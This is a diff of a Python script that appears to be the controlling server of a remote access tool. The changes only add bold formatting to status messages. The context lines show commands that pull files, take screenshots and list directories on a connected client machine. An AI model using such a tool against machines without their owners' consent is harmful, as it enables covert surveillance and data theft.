@@ -30,7 +30,7 @@ restartTerminal = (YELLOW + BOLD + '[!] Sometimes restarting the terminal may he
 failed = (RED + BOLD + '[!] Failed!' + END)
 
 def signal_handler(sig, frame):
-    print(RED + '\n\nQuitting...\n' + END)
+    print(RED + BOLD + '\n\nQuitting...\n' + END)
     sys.exit(0)
 
 def socketCreate():
@@ -151,7 +151,7 @@ def sendCommands(conn):
                 file.close()
                 print(GREEN + BOLD + '[*] Downloaded successfully to downloads/' + filename + END)
             except:
-                print(RED + '[!] There was an error downloading your file.' + END)
+                print(RED + BOLD + '[!] There was an error downloading your file.' + END)
                 pass
         elif cmd == 'screenshot':
             conn.send(str.encode(cmd))
@@ -181,14 +181,14 @@ def sendCommands(conn):
             img = Image.open(BytesIO(frame))
             imgname = 'downloads/screenshot' + str(datetime.datetime.now()) + '.png'
             img.save(imgname)
-            print(GREEN + '[*] Screenshot output in ' + END + CYAN + imgname + END)
+            print(GREEN + BOLD + '[*] Screenshot output in ' + END + CYAN + imgname + END)
             print('                     ')
         elif cmd == 'dir':
             conn.send(str.encode(cmd))
             clientResponse = str(conn.recv(1024), "utf-8")
             print('\n' + clientResponse, end="")
         else:
-            print(RED + '\n[!] Command no recognized\n' + END)
+            print(RED + BOLD + '\n[!] Command no recognized\n' + END)
 
 
 def main():
